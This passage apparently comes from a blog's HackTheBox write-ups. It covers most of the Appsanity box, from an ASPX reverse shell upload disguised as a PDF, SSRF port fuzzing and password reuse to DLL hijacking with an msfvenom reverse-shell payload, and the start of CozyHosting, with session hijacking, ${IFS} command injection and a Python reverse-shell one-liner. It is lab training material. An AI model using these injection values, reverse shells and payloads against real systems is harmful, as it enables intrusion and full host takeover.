token I am decoding another account I tried (and successfully made), with the email admin@appsanity.htb. The goal was to see if I could find potentially existing usernames, which didn\u0026rsquo;t work out.\n1 2 3 4 5 6 7 8 9 { \u0026#34;unique_name\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;admin@appsanity.htb\u0026#34;, \u0026#34;nbf\u0026#34;: 1698539553, \u0026#34;exp\u0026#34;: 1698543153, \u0026#34;iat\u0026#34;: 1698539553, \u0026#34;iss\u0026#34;: \u0026#34;MedDigi\u0026#34;, \u0026#34;aud\u0026#34;: \u0026#34;MedDigiUser\u0026#34; } Normally JWT tokens are signed with an internal key (blue text) and the signing method is described in the header (red text). An occasional misconfiguration might be a situation where the signature is never actually verified, or will accept an signing algorithm type of \u0026ldquo;None\u0026rdquo;. In these situations we might forge our own token to assume the identity of another user. Unfortunately, this does not work for us. When I edit my unique_name to be that of an earlier user, for example 1, my authentication is rejected and I am placed outside of authentication pages.\nEditing hidden variable in registration When making account notice the final variable, acctype: 1 Name=asdf\u0026amp;LastName=asdf\u0026amp;Email=admin1%40appsanity.htb\u0026amp;Password=Appsanity1\u0026amp;ConfirmPassword=Appsanity1\u0026amp;DateOfBirth=1999-01-01\u0026amp;PhoneNumber=1234567890\u0026amp;Country=asdf\u0026amp;Acctype=1\u0026amp; This is a patient account type. However, we can just manually change the value to 2. Now we have higher privileges:\nMy new account is considered a Doctor, and I have the new option of adding patients. When I add myself as supervising my older account, I can now see it upon logging in as the other user. At this point, it\u0026rsquo;s looking like a lot of back-and-forth. To make the process a little easier, I opened a new incognito tab to flush cookies, and in that tab logged in as the patient user while in my original tab I am the supervisor user.\nAlthough I can send a message to my supervisor, I\u0026rsquo;m not seeing any way to interact with the message.\nAccessing portal subdomain through cookie re-use Although we don\u0026rsquo;t have the access token to log into portal.meddigi.htb, we have a valid access token for the main site. When I try to add my valid cookie to portal, it lets me in:\nFile upload potential in portal subdomain Notably interesting, the upload exam report section Only pdf is allowed. Is this magic byte verification?\nWe can add magic byte to trick the upload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ head shell.aspx %PDF-1.5 \u0026lt;%@ Page Language=\u0026#34;C#\u0026#34; %\u0026gt; \u0026lt;%@ Import Namespace=\u0026#34;System.Runtime.InteropServices\u0026#34; %\u0026gt; \u0026lt;%@ Import Namespace=\u0026#34;System.Net\u0026#34; %\u0026gt; \u0026lt;%@ Import Namespace=\u0026#34;System.Net.Sockets\u0026#34; %\u0026gt; \u0026lt;%@ Import Namespace=\u0026#34;System.Security.Principal\u0026#34; %\u0026gt; \u0026lt;%@ Import Namespace=\u0026#34;System.Data.SqlClient\u0026#34; %\u0026gt; \u0026lt;script runat=\u0026#34;server\u0026#34;\u0026gt; //Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/ ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ file shell.aspx shell.aspx: PDF document, version 1.5 By doing this, our payload is accepted.\nRemote connection possible in Prescription Link submission On the Issue Prescriptions tab, there is an option to submit a prescription link. When we supply our own address, we can get a connection back:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.154.179] 56535 GET /asdf HTTP/1.1 Host: 10.10.14.134 traceparent: 00-d84be00c1219df2a746a0b1f8660d6fa-ed08423e51158377-00 Unfortunately, only http and https methods are allowed. Additionally, no NTLM authentication is sent for Responder capturing.\nSSRF potential in Prescription Link Although the responses on web pages are somewhat unintuitive, we might discover that SSRF is possible. The most obvious way to see this is by sending an http request to the Win-RM port, as it shows a 404 not found error:\nUnlike a lot of ports that hang on http requests, winrm will always respond with this 404. This is nice to see, because strangely enough sending requests to port 80 or 443 does not work well.\nFuzzing internal ports via SSRF Since we know we are accessing ports internally, we might find a port open only for internal requests. We can fuzz for this. For whatever reason, ffuf will not fuzz properly, so I chose to fuzz using a for loop with curl:\n1 for i in {1..65535}; echo $i; do curl -s \u0026#39;https://portal.meddigi.htb/Prescriptions/SendEmail\u0026#39; -b \u0026#39;access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjkiLCJlbWFpbCI6ImFzZGYxQGFzZGYuYXNkZiIsIm5iZiI6MTY5OTA1MTYzMywiZXhwIjoxNjk5MDU1MjMzLCJpYXQiOjE2OTkwNTE2MzMsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.j3hHqxHUFtMWtxy52NIeCbaYG-CluoOubN1_kOTJ2YM; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8CrSHtzBF1JNhsF1CyVvUorTLizskLt_8YolzUh3Z-GepR2ZGiTyxSHB4G4ksqt6mFe3ajKZtH5kaY75bmGRptGuDdZqAGUaB6B-N0vKM8s-b6gBw9RcZJRuwqCSP-gjpKwsNqgEflJpT4_DBTPmm_k\u0026#39; -d \u0026#34;Email=asdf@asdf.asdf\u0026amp;Link=http://127.0.0.1:$i\u0026#34; -k; done The method is ridiculously slow, but it does get the job done.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;...SNIP...\u0026gt; 5984 5985 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34;\u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; \u0026lt;HTML\u0026gt;\u0026lt;HEAD\u0026gt;\u0026lt;TITLE\u0026gt;Not Found\u0026lt;/TITLE\u0026gt; \u0026lt;META HTTP-EQUIV=\u0026#34;Content-Type\u0026#34; Content=\u0026#34;text/html; charset=us-ascii\u0026#34;\u0026gt;\u0026lt;/HEAD\u0026gt; \u0026lt;BODY\u0026gt;\u0026lt;h2\u0026gt;Not Found\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;p\u0026gt;HTTP Error 404. The requested resource is not found.\u0026lt;/p\u0026gt; \u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt; \u0026lt;...SNIP...\u0026gt; 8078 8079 8080 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Examinations Panel\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; /* Center the table on the page */ table { margin: 0 auto; } /* Optional: If you want to set a max width and ensure the table does not stretch full screen */ body { max-width: 1200px; margin: 0 auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;...SNIP...\u0026gt; We can see our previously tested WinRM port returning a 404, and also a page response on port 8080.\nFoothold Remote Shell access via SSRF + LFI vulnerabilities When submitting the link to internal port 8080 through the traditional web browser, we can see the response as a preview popup:\nWe can scroll to the left of the table, and we see a hyperlink for our upload:\nhttps://portal.meddigi.htb/ViewReport.aspx?file=62082e85-664a-4fc8-8eff-c0735d136fe0_shell.aspx\nWe can try to access this file using LFI: Note that instead of using the domain name portal.meddigi.htb, we must continue using 127.0.0.1:8080.\nOn my listener port, I receive a connection:\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.194] from (UNKNOWN) [10.10.11.238] 58166 Spawn Shell... Microsoft Windows [Version 10.0.19045.3570] (c) Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u0026gt;whoami whoami appsanity\\svc_exampanel We now have a reverse shell, as user svc_exampanel. At this point we can acquire the user flag:\n1 2 3 4 5 6 7 8 9 10 11 12 c:\\windows\\system32\\inetsrv\u0026gt;dir C:\\Users\\svc_exampanel\\Desktop dir C:\\Users\\svc_exampanel\\Desktop Volume in drive C has no label. Volume Serial Number is F854-971D Directory of C:\\Users\\svc_exampanel\\Desktop 10/18/2023 05:41 PM \u0026lt;DIR\u0026gt; . 10/18/2023 05:41 PM \u0026lt;DIR\u0026gt; .. 11/03/2023 03:40 PM 34 user.txt 1 File(s) 34 bytes 2 Dir(s) 3,664,117,760 bytes free Lateral Movement Enumerating the ExaminationPanel Within the inetpub, we can find several services. The MedDigi main page, the subdomain MedDigiPortal, and presumably the internal webpage we SSRF\u0026rsquo;d as ExaminationPanel:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 PS C:\\inetpub\u0026gt;ls ls Directory: C:\\inetpub Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2023 7:22 AM custerr d----- 11/3/2023 5:17 PM Databases d----- 9/24/2023 8:49 AM ExaminationPanel d----- 10/23/2023 12:41 PM history d----- 9/15/2023 7:24 AM logs d----- 9/24/2023 8:50 AM MedDigi d----- 9/24/2023 9:15 AM MedDigiPortal d----- 9/15/2023 7:22 AM temp d----- 9/16/2023 9:58 AM wwwroot Our user cannot access MedDigi or MedDigiPortal\n1 2 3 4 5 6 7 8 9 PS C:\\inetpub\\\u0026gt; ls C:\\inetpub\\MedDigi\\ ls C:\\inetpub\\MedDigi\\ ls : Access to the path \u0026#39;C:\\inetpub\\MedDigi\u0026#39; is denied. At line:1 char:1 + ls C:\\inetpub\\MedDigi\\ + ~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\inetpub\\MedDigi\\:String) [Get-ChildItem], UnauthorizedAccessExcept ion + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand However, ExaminationPanel is accessible. Inside, we see an interesting bin folder containing a particularly interesting dll with a unique name:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 PS C:\\inetpub\\ExaminationPanel\\ExaminationPanel\\bin\u0026gt; ls ls Directory: C:\\inetpub\\ExaminationPanel\\ExaminationPanel\\bin Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/24/2023 8:49 AM roslyn d----- 9/24/2023 8:49 AM x64 d----- 9/24/2023 8:49 AM x86 -a---- 9/24/2023 8:46 AM 4991352 EntityFramework.dll -a---- 9/24/2023 8:46 AM 591752 EntityFramework.SqlServer.dll -a---- 9/24/2023 8:46 AM 13824 ExaminationManagement.dll -a---- 9/24/2023 8:46 AM 40168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll -a---- 9/24/2023 8:46 AM 431792 System.Data.SQLite.dll -a---- 9/24/2023 8:46 AM 206512 System.Data.SQLite.EF6.dll -a---- 9/24/2023 8:46 AM 206520 System.Data.SQLite.Linq.dll ExaminationManagement.dll is clearly uniquely built for this environment, so it warrants a deeper look.\nAnalyzing ExaminationManagement.dll We can transfer the file using impacket-smbserver, then decompile in a local Windows environment through dnSpy. First setting up smbserver on kali:\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ impacket-smbserver asdf ./ -smb2support Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Next, copying the file over:\n1 2 PS C:\\inetpub\\ExaminationPanel\\ExaminationPanel\\bin\u0026gt; copy .\\EntityFramework.dll \\\\10.10.14.194\\asdf\\ copy .\\EntityFramework.dll \\\\10.10.14.194\\asdf\\ When we decompile, we can find an interesting behavior on how the service obtains a secret key for encryption; it is querying a registry key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 private string RetrieveEncryptionKeyFromRegistry() { string result; try { using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0026#34;Software\\\\MedDigi\u0026#34;)) { if (registryKey == null) { ErrorLogger.LogError(\u0026#34;Registry Key Not Found\u0026#34;); base.Response.Redirect(\u0026#34;Error.aspx?message=error+occurred\u0026#34;); result = null; } This registry key should probably be something we can view as well:\n1 2 3 4 5 PS C:\\inetpub\\examinationpanel\\examinationpanel\\bin\u0026gt; reg query \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\MedDigi\u0026#34; reg query \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\MedDigi\u0026#34; HKEY_LOCAL_MACHINE\\SOFTWARE\\MedDigi EncKey REG_SZ 1g0tTh3R3m3dy!! The key looks suspiciously like a password. With WinRM open, we can try a password spray to see if any users have this as their password. First, use net user to get a list of users on the system:\n1 2 3 4 5 6 7 User accounts for \\\\APPSANITY ------------------------------------------------------------------------------- Administrator DefaultAccount devdoc Guest svc_exampanel svc_meddigi svc_meddigiportal WDAGUtilityAccount The command completed successfully. Since we are trying WinRM, we could also look for which users might have the privilege by being part of the Remote Users group:\n1 2 3 4 5 6 7 8 9 10 PS C:\\inetpub\\ExaminationPanel\\ExaminationPanel\\bin\u0026gt; net localgroup \u0026#39;Remote Management Users\u0026#39; net localgroup \u0026#39;Remote Management Users\u0026#39; Alias name Remote Management Users Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. Members ------------------------------------------------------------------------------- devdoc The command completed successfully. If this is a password for any user, it is likely for devdoc. Fortunately, it is!\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ cme winrm meddigi.htb -u devdoc -p \u0026#39;1g0tTh3R3m3dy!!\u0026#39; SMB meddigi.htb 5985 NONE [*] None (name:meddigi.htb) (domain:None) HTTP meddigi.htb 5985 NONE [*] http://meddigi.htb:5985/wsman WINRM meddigi.htb 5985 NONE [+] None\\devdoc:1g0tTh3R3m3dy!! (Admin!) Privilege Escalation Discovery of Reports Management Console When enumerating internal ports, we can find yet another port we have not checked out before:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 *Evil-WinRM* PS C:\\Users\\devdoc\\Desktop\u0026gt; netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:100 0.0.0.0:0 LISTENING 4776 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 916 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 4912 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 4 \u0026lt;...SNIP...\u0026gt; Notice the unusual port 100. We could have seen this earlier as svc_exampanel, but it is difficult to interact with through the reverse shell. Now with Evil-WinRM, we can easily establish a tunnel using chisel, then interact with the port on our local kali. First, uploading chisel:\n1 2 3 4 5 6 7 *Evil-WinRM* PS C:\\Users\\devdoc\\Desktop\u0026gt; upload /opt/chisel/chisel.exe Info: Uploading /opt/chisel/chisel.exe to C:\\Users\\devdoc\\Desktop\\chisel.exe Data: 12008104 bytes of 12008104 bytes copied Info: Upload successful! On kali, establish a reverse chisel listener:\n1 2 3 4 5 ┌──(kali㉿kali)-[/opt/chisel] └─$ ./chisel server -p 8000 --reverse 2023/11/01 17:00:04 server: Reverse tunnelling enabled 2023/11/01 17:00:04 server: Fingerprint dvjvmDdco0ZHxnPqgpFqF8Jv/zSQPmy1DNlrftgZWWs= 2023/11/01 17:00:04 server: Listening on http://0.0.0.0:8000 Finally, connect with chisel.exe on the target:\n1 .\\chisel.exe client 10.10.14.134:8000 R:100:127.0.0.1:100 Now we can interact with the port using nc:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ nc localhost 100 Reports Management administrative console. Type \u0026#34;help\u0026#34; to view available commands. help Available Commands: backup: Perform a backup operation. validate: Validates if any report has been altered since the last backup. recover \u0026lt;filename\u0026gt;: Restores a specified file from the backup to the Reports folder. upload \u0026lt;external source\u0026gt;: Uploads the reports to the specified external source. We are given several options, and they seem to be related to the Reports folder that we might find back at C:\\inetpub\\ExaminationPanel\\ExaminationPanel\\Reports. If we look at Program Files, we can find a folder for this Reports Management tool. Note that this is where lateral movement to devdoc is necessary, as our other user cannot access this folder:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 *Evil-WinRM* PS C:\\Program Files\\ReportManagement\u0026gt; ls Directory: C:\\Program Files\\ReportManagement Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/3/2023 5:51 PM Libraries -a---- 5/5/2023 5:21 AM 34152 cryptbase.dll -a---- 5/5/2023 5:21 AM 83744 cryptsp.dll -a---- 3/11/2021 9:22 AM 564112 msvcp140.dll -a---- 9/17/2023 3:54 AM 140512 profapi.dll -a---- 10/20/2023 2:56 PM 102912 ReportManagement.exe -a---- 10/20/2023 1:47 PM 11492864 ReportManagementHelper.exe -a---- 3/11/2021 9:22 AM 96144 vcruntime140.dll -a---- 3/11/2021 9:22 AM 36752 vcruntime140_1.dll -a---- 5/5/2023 5:21 AM 179248 wldp.dll Analysis of ReportManagement.exe Setting up Process Monitor in Windows We also can note that Libraries folder is writable by us, while the main folder is not.\n1 2 3 4 5 6 7 8 9 10 11 12 *Evil-WinRM* PS C:\\Program Files\\ReportManagement\u0026gt; icacls \u0026#39;C:\\Program Files\\ReportManagement\\Libraries\u0026#39; C:\\Program Files\\ReportManagement\\Libraries APPSANITY\\devdoc:(OI)(CI)(RX,W) BUILTIN\\Administrators:(I)(F) CREATOR OWNER:(I)(OI)(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F) BUILTIN\\Users:(I)(OI)(CI)(R) NT SERVICE\\TrustedInstaller:(I)(CI)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX) Successfully processed 1 files; Failed processing 0 files APPSANITY\\devdoc:(OI)(CI)(RX,W) gives us read, execute, and write permissions for this folder. However, we might not think dll hijacking is possible due to the main folder containing all the .dll\u0026rsquo;s that we see, and Libraries is empty. To get a better understanding of what this program is doing, I transferred all files in the folders to a Windows VM, where I can monitor activities using Process Monitor.\nFor filterings, we can filter by Process Name, containing \u0026ldquo;ReportManagement.\u0026rdquo;\nNow we can run the ReportManagement.exe, to avoid permission conflicts I simply run as administrator. This might not be a good idea if you don\u0026rsquo;t use a virtual machine.\nNow, to connect to the open port 100, I used nc.exe:\nUsing Process Monitor to track each command By watching the process monitor, we can see what actions are being taken on each command. For instance, recover seems to be looking in the folder C:\\Users\\Administrator\\Backup. Additionally, it looks like we can perform directory traversal. However, I wasn\u0026rsquo;t able to get this type of attack working well.\nWhen looking at upload, we can see the service accessing files in Libraries. Out of all commands, this appears to be the only one doing something with Libraries, the folder we have write permissions over.\nWhen we cat the file contents of the executable, we can see some interesting stuff related to upload as well:\n1 2 3 upload Invalid command. Missing parameter after \u0026#39;upload\u0026#39;. Type \u0026#39;help\u0026#39; for available commands. %sC:\\Program Files\\ReportManagement\\Libraries.dllexternaluploadFailed to upload to external source. /c ReportManagementHelper Libraries\\c:\\Windows\\System32\\cmd.exeAttempting to upload to external source. This can be more clear in a text editor like vim:\nThe file it is searching for is externalupload.dll. We can add a dummy externalupload.dll and see how the program behaves in ProcMon:\n1 PS C:\\Users\\Flare\\Desktop\u0026gt; echo \u0026#39;test\u0026#39; \u0026gt; \u0026#39;C:\\Program Files\\ReportManagement\\Libraries\\externalupload.dll\u0026#39; Abusing RemoteManagement via DLL hijacking When we attempt upload again, we see a new message of Attempting to upload, and cmd.exe is also spawned as well. I thought we would see externalupload.dll would be accessed, but maybe we cannot see it while filtering for ReportManager as the process name. Regardless, we know that adding externalupload.dll causes additional behaviors that we might abuse.\nWe can generate a reverse shell payload with msfvenom, and deliver it to the Libraries folder:\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.134 LPORT=8080 -f dll -o externalupload.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 1879 bytes Final size of dll file: 9216 bytes Saved as: externalupload.dll Uploading the file:\n1 2 3 4 5 6 7 *Evil-WinRM* PS C:\\Program Files\\ReportManagement\\Libraries\u0026gt; upload externalupload.dll Info: Uploading /home/kali/Documents/Appsanity/externalupload.dll to C:\\Program Files\\ReportManagement\\Libraries\\externalupload.dll Data: 12288 bytes of 12288 bytes copied Info: Upload successful! Lastly, attempting to call upload:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ nc localhost 100 Reports Management administrative console. Type \u0026#34;help\u0026#34; to view available commands. upload asdf Attempting to upload to external source. Meanwhile on my listener:\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ nc -nlvp 8080 listening on [any] 8080 ... connect to [10.10.14.194] from (UNKNOWN) [10.10.11.238] 61785 Windows PowerShell running as user Administrator on APPSANITY Copyright (C) Microsoft Corporation. All rights reserved. whoami appsanity\\administrator PS C:\\Program Files\\ReportManagement\u0026gt; Finally, we have access as Administrator!\n","date":"2024-03-09T20:49:21-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-appsanity/Appsanity_hu82f755fa3f9a678df53f9e67501d6a70_337278_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-appsanity/","title":"HackTheBox - Appsanity"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 3:11 EDT Nmap scan report for 10.129.105.187 Host is up (0.051s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA) |_ 256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://cozyhosting.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds When visiting the port 80 website, we are redirected to cozyhosting.htb. Adding this to our /etc/hosts file:\n1 10.129.105.187 cozyhosting.htb Exploring webpage Viewing the webpage, there is not much more than a login page:\nTrying generic logins such as admin:password fail, and fuzzing for subdomains or hidden webpages does not yield much. When we take a look at the error message, though, we can glean a little information about the backend:\nWhen we google search this Whitelabel Error Page, it returns information on Spring. Eventually, I think to fuzz for pages again, this time using a spring-boot wordlist:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ feroxbuster -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt \u0026lt;...SNIP...\u0026gt; http://cozyhosting.htb/actuator/env/spring.jmx.enabled 200 GET 1l 1w 498c http://cozyhosting.htb/actuator/sessions 200 GET 83l 453w 36234c http://cozyhosting.htb/assets/img/values-3.png 200 GET 1l 1w 634c http://cozyhosting.htb/actuator 200 GET 1l 1w 15c http://cozyhosting.htb/actuator/health 200 GET 1l 13w 487c http://cozyhosting.htb/actuator/env/path 200 GET 1l 13w 487c http://cozyhosting.htb/actuator/env/lang 200 GET 1l 13w 487c http://cozyhosting.htb/actuator/env/home 200 GET 73l 470w 37464c http://cozyhosting.htb/assets/img/values-1.png 200 GET 1l 218w 26053c http://cozyhosting.htb/assets/vendor/aos/aos.css 200 GET 1l 120w 4957c http://cozyhosting.htb/actuator/env 200 GET 1l 313w 14690c http://cozyhosting.htb/assets/vendor/aos/aos.js 200 GET 79l 519w 40905c http://cozyhosting.htb/assets/img/values-2.png 200 GET 1l 108w 9938c http://cozyhosting.htb/actuator/mappings 200 GET 1l 625w 55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js 200 GET 2018l 10020w 95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css 200 GET 7l 1222w 80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js 200 GET 2397l 4846w 42231c http://cozyhosting.htb/assets/css/style.css 200 GET 14l 1684w 143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js 200 GET 1l 542w 127224c http://cozyhosting.htb/actuator/beans 200 GET 7l 2189w 194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css 200 GET 285l 745w 12706c http://cozyhosting.htb/ Actuator is a new result, and viewing actuator is quite interesting:\nViewing valid cookie sessions and session hijacking Looking at sessions, we can see all sessions, including the cookie and associated authentication. Among the list, there is a valid session for a certain user:\nkanderson is a user. We might be able to brute force the login, but for now we can just steal his cookie\nIn firefox inspect, we substitute JSESSIONID value with kanderson\u0026rsquo;s:\nNow we can visit cozyhosting.htb/admin.\nThe page itself does not have much to go on, but there does seem to be a remote connection component that is worth exploring:\nInterestingly, ssh connection attempt does not reach my box despite listening on port 22\nEven more interesting is the error received when submitting a break:\nIn the url response:\n1 http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]/bin/bash:%20line%201:%20@127.0.0.1:%20command%20not%20found Foothold RCE via command injection This error matches what we would expect when performing an invalid ssh operation in a shell session, suggesting the command is run as some sort of shell execute. Perhaps we can abuse this to achieve remote code execution?\nOne small problem, there is no witespace allowed in username field:\nWe have a way to avoid this, by utilizing ${IFS}. In bash, this is treated as a space, and can be utilized to bypass the whitespace filter if it is indeed executed as shell command.\nUsing ${IFS} to curl:\n1 kali@10.10.14.134;curl${IFS}10.10.14.134;# On our attacker machine:\n1 2 3 4 5 6 7 $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.105.187] 46286 GET / HTTP/1.1 Host: 10.10.14.134 User-Agent: curl/7.81.0 Accept: */* We have a hit! So now, hopefully we can supply a rev shell 1 liner and get a reverse shell!\nAfter struggling with reverse shells for a while, I finally got a working solution. Generate rev.py on kali machine:\n1 2 $ cat rev.py import os,pty,socket;s=socket.socket();s.connect((\u0026#34;10.10.14.134\u0026#34;,8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;/bin/bash\u0026#34;) Pick it up with curl command on server:\n1 kali@10.10.14.134;curl${IFS}10.10.14.134/rev.py${IFS}-o${IFS}/tmp/rev.py on my kali, python server:\n1 2 3 $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.105.187 - - [03/Sep/2023 00:29:36] \u0026#34;GET /rev.py HTTP/1.1\u0026#34; 200 - Finally, launch the python script once again in the username box:\n1 kali@10.10.14.134;python3${IFS}/tmp/rev.py;# meanwhile on my listener:\n1 2 3 4 5 6 7 $ nc -vnlp 8888 listening on [any] 8888 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.105.187] 47932 app@cozyhosting:/app$ whoami whoami app app@cozyhosting:/app$ User Enumeration In the current working directory, we have a compiled jar file:\n1 2 app@cozyhosting:/app$ ls cloudhosting-0.0.1.jar This can be extracted very simply, but first I will transfer this to my kali machine\n1 app@cozyhosting:/app$ python3 -m http.server 8888 On the kali:\n1 2 3 4 5 6 7 8 9 10 11 $ wget cozyhosting.htb:8888/cloudhosting-0.0.1.jar --2023-09-03 01:16:45-- http://cozyhosting.htb:8888/cloudhosting-0.0.1.jar Resolving cozyhosting.htb (cozyhosting.htb)... 10.129.105.187 Connecting to cozyhosting.htb (cozyhosting.htb)|10.129.105.187|:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 60259688 (57M) [application/java-archive] Saving to: ‘cloudhosting-0.0.1.jar’ cloudhosting-0.0.1.jar 100%[==============================================\u0026gt;] 57.47M 1.49MB/s in 39s 2023-09-03 01:17:24 (1.47 MB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688] After unzipping, we can find information in the application.properties:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ cat BOOT-INF/classes/application.properties server.address=127.0.0.1 server.servlet.session.timeout=5m management.endpoints.web.exposure.include=health,beans,env,sessions,mappings management.endpoint.sessions.enabled = true spring.datasource.driver-class-name=org.postgresql.Driver 